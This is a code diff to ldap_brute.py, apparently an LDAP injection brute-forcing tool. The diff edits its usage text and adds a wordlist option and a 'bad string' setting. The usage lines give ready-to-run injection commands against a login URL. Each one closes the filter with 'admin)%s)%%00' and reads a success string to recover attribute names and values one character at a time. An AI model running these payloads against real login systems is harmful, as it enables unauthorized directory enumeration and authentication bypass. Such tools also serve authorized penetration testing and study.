@@ -13,8 +13,8 @@ Non-wildcard example:
     python ldap_brute.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
     Some LDAP attributes do not support wildcards, in which case you should use
-    --no-wildcard. In this example, note how the %s needs to be placed right at the
-    end of an always-true filter and its respective close parenthesis.
+    --no-wildcard. In this example, note how the %s needs to be placed right at
+    the end of an always-true filter and its respective close parenthesis.
 
     Strings inserted look like
     "(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
@@ -22,10 +22,13 @@ Non-wildcard example:
 
 Bruteforcing attributes:
     python ldap_brute.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+    python ldap_brute.py -A -w wordlists/attribute_names 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
     Recommend only using -c 'lower', since using digits can cause invalid
-    attributes (like '9c') to be mixed with valid attributes, which is not handled
-    properly at all.
+    attributes (like '9c') to be mixed with valid attributes, which is not
+    handled.
+
+    Strings inserted similar to non-wildcard.
 
 NOTE: Remember to quote the URL because bash! And also remember that % needs to
 be escaped as %%, because python/printf.
@@ -120,6 +123,9 @@ def main(args, output=True):
 
     common.charset_set(args.charset,
             args.charset_custom, args.wordlist)
+
+    if(args.bad_string):
+        common.LDAP_GLOBALS.bad_string = args.bad_string
 
     if not args.no_wildcard and not args.brute_attr:
         valid_values = brute(args.URL, args.TRUE_STRING)
